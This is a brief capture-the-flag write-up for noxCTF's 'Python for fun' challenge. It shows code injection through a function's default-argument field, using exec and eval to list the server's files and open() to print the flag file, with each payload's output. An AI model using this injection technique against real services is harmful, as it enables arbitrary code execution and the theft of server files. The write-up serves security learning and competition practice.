# **Python for fun**

#### tag : misc

-----------------------------------------------

#### Description

>Welcome to noxale's online python class!!! You can try it for free for a limited time and learn basic programming in python 3. http://chal.noxale.com:8000

-----------------------------------------------

#### Solution

There are three tabs that give me python3's problems. But I focus second tab that give me result of interpreter.

When payload is `a,b`

~~~

def fun(a,b):
  c = a + b
  return c

print(fun(10,12) == 22)

~~~

~~~

True

~~~

When payload is `a,b=exec('import os'),eval('os.listdir("./")')`

~~~

def fun(a,b=exec('import os'),eval('os.listdir("./")')):
  c = a + b
  return c

print(fun(10,12) == 22)

~~~

~~~

None ['db.sqlite3', 'learn_python', 'python_ctf_thing', 'Dockerfile', 'FLAG', 'manage.py', 'requirements.txt', 'templates']
True

~~~

When payload is `a,b=print(open('FLAG').read())`

~~~

def fun(a,b=print(open('FLAG').read())):
  c = a + b
  return c

print(fun(10,12) == 22)

~~~

~~~

noxCTF{py7h0n_15_4w350m3}
True

~~~

**noxCTF{py7h0n_15_4w350m3}**
